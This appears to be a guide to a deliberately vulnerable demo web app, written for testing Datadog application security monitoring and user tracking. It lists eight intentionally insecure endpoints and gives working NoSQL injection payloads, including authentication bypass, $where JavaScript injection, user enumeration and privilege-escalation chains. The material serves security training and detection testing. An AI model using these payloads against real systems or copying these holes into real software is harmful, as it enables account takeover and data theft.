â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘              DATADOG USER TRACKING & SECURITY TESTING GUIDE                  â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ¯ NEW FEATURES ADDED
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

âœ… DATADOG USER TRACKING INSTRUMENTATION
   â€¢ Tracks user activity across all authenticated requests
   â€¢ Captures: User ID, Email, Username, Role
   â€¢ Integrated in: Login, Register, Authentication Middleware
   â€¢ Enables user attribution in Datadog ASM

âœ… 8 INTENTIONAL NOSQL INJECTION VULNERABILITIES
   â€¢ User search injection
   â€¢ Authentication bypass
   â€¢ JavaScript injection via $where
   â€¢ Query operator injection
   â€¢ Broken access control
   â€¢ User enumeration
   â€¢ Blind NoSQL injection
   â€¢ Privilege escalation

âœ… COMPREHENSIVE TESTING TOOLS
   â€¢ Automated test script (test-vulnerabilities.sh)
   â€¢ Full documentation (NOSQL_VULNERABILITIES.md)
   â€¢ Attack examples and scenarios
   â€¢ Prevention guidance


ğŸ“ FILES CREATED/MODIFIED
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

NEW FILES:
â”œâ”€â”€ backend/routes/vulnerable.js       â†’ 8 vulnerable endpoints
â”œâ”€â”€ NOSQL_VULNERABILITIES.md          â†’ Complete testing guide
â”œâ”€â”€ test-vulnerabilities.sh            â†’ Automated testing script
â””â”€â”€ DATADOG_SECURITY_TESTING.txt      â†’ This file

MODIFIED FILES:
â”œâ”€â”€ backend/routes/auth.js             â†’ Added user tracking
â”œâ”€â”€ backend/middleware/auth.js         â†’ Added user tracking
â”œâ”€â”€ backend/server.js                  â†’ Added vulnerable routes
â””â”€â”€ README.md                          â†’ Updated features list


ğŸ”’ DATADOG USER TRACKING
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

Implementation in auth.js and middleware/auth.js:

const span = tracer.scope().active();
if (span) {
  span.setUser({
    id: user._id.toString(),
    email: user.email,
    name: user.username,
    role: user.role
  });
}

WHEN IT TRACKS:
  âœ“ User registration (POST /api/auth/register)
  âœ“ User login (POST /api/auth/login)
  âœ“ Every authenticated request (via authenticate middleware)

WHAT YOU'LL SEE IN DATADOG:
  â€¢ User identities in all traces
  â€¢ Attack attribution to specific users
  â€¢ User behavior patterns
  â€¢ Compromised account detection
  â€¢ Session correlation


ğŸ¯ VULNERABLE ENDPOINTS
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

Base URL: http://localhost:5000/api/vulnerable

1. GET  /search-user              â†’ User enumeration
2. POST /insecure-login           â†’ Authentication bypass
3. GET  /search-movies-where      â†’ JavaScript injection
4. GET  /movies-by-price          â†’ Operator injection
5. GET  /rentals-insecure         â†’ Access control bypass
6. GET  /user-exists              â†’ Regex injection
7. GET  /search-slow              â†’ Blind injection
8. POST /update-profile-insecure  â†’ Privilege escalation

INFO:
  GET /test-vulnerable            â†’ List all vulnerabilities


ğŸ§ª QUICK START TESTING
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

1. START THE APPLICATION:
   cd video-rental-store
   docker-compose up -d

2. RUN THE TEST SCRIPT:
   ./test-vulnerabilities.sh

3. OR TEST MANUALLY:
   # List all users
   curl "http://localhost:5000/api/vulnerable/search-user?username[\$ne]=null"

   # Bypass authentication
   curl -X POST http://localhost:5000/api/vulnerable/insecure-login \
     -H "Content-Type: application/json" \
     -d '{"email":"user@example.com","password":{"$ne":null}}'

   # JavaScript injection
   curl "http://localhost:5000/api/vulnerable/search-movies-where?title=1;return true;//"

4. CHECK DATADOG:
   https://app.datadoghq.com/security/appsec


ğŸ“Š WHAT YOU'LL SEE IN DATADOG ASM
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

SECURITY SIGNALS:
  â€¢ NoSQL Injection attempts
  â€¢ Code Injection (JavaScript via $where)
  â€¢ Authentication bypass attempts
  â€¢ Access control violations
  â€¢ User enumeration attacks

USER INFORMATION:
  â€¢ Attacker user IDs
  â€¢ Email addresses
  â€¢ Usernames
  â€¢ Roles (user/admin)
  â€¢ Attack patterns per user

TRACES:
  â€¢ Individual attack requests
  â€¢ Full request/response data
  â€¢ Query parameters used
  â€¢ Attack payloads
  â€¢ Response times


ğŸ’¡ ATTACK EXAMPLES
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

EXAMPLE 1: Complete Account Takeover
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. Enumerate users                                  â”‚
â”‚    GET /search-user?username[$regex]=^admin         â”‚
â”‚                                                     â”‚
â”‚ 2. Bypass authentication                            â”‚
â”‚    POST /insecure-login                             â”‚
â”‚    {"email":"admin@store.com","password":{"$ne":""}}â”‚
â”‚                                                     â”‚
â”‚ 3. Access all data                                  â”‚
â”‚    GET /rentals-insecure?userId[$ne]=null          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

EXAMPLE 2: Privilege Escalation
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. Register as normal user                          â”‚
â”‚    POST /api/auth/register                          â”‚
â”‚                                                     â”‚
â”‚ 2. Elevate to admin                                 â”‚
â”‚    POST /update-profile-insecure                    â”‚
â”‚    {"userId":"YOUR_ID","updateData":{"role":"admin"}}â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

EXAMPLE 3: Data Extraction
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ GET /search-user?username[$ne]=null                 â”‚
â”‚ GET /movies-by-price?minPrice[$gte]=0&...          â”‚
â”‚ GET /rentals-insecure?userId[$ne]=null             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜


ğŸ“š DOCUMENTATION
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

DETAILED GUIDES:
  â€¢ NOSQL_VULNERABILITIES.md  â†’ Complete testing guide
  â€¢ README.md                 â†’ Updated with new features
  â€¢ test-vulnerabilities.sh   â†’ Automated testing

DATADOG DOCUMENTATION:
  â€¢ User Tracking: https://docs.datadoghq.com/security/application_security/how-it-works/add-user-info/
  â€¢ ASM Overview: https://docs.datadoghq.com/security/application_security/


âš ï¸  IMPORTANT WARNINGS
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

âŒ NEVER use vulnerable endpoints in production
âŒ NEVER deploy this to public internet
âŒ NEVER use with real customer data
âŒ ONLY for security testing and learning

âœ“ USE FOR:
  â€¢ Testing Datadog ASM
  â€¢ Security training
  â€¢ Vulnerability demonstration
  â€¢ Learning attack patterns
  â€¢ Testing detection capabilities


ğŸ“ LEARNING OUTCOMES
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

After using this application, you'll understand:
  âœ“ How NoSQL injection attacks work
  âœ“ Different attack vectors and techniques
  âœ“ How Datadog ASM detects threats
  âœ“ Importance of user tracking in security
  âœ“ Real-time threat detection capabilities
  âœ“ Attack attribution and correlation
  âœ“ How to fix NoSQL vulnerabilities


ğŸš€ NEXT STEPS
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

1. Start the application:
   docker-compose up -d

2. Run test script:
   ./test-vulnerabilities.sh

3. View Datadog dashboard:
   https://app.datadoghq.com/security/appsec

4. Try manual attacks from NOSQL_VULNERABILITIES.md

5. Observe detection in real-time

6. Learn prevention techniques


ğŸ“ SUPPORT
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

Documentation: See NOSQL_VULNERABILITIES.md
Test Script: ./test-vulnerabilities.sh
Datadog Docs: https://docs.datadoghq.com/security/application_security/

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

Happy Security Testing! ğŸ”’
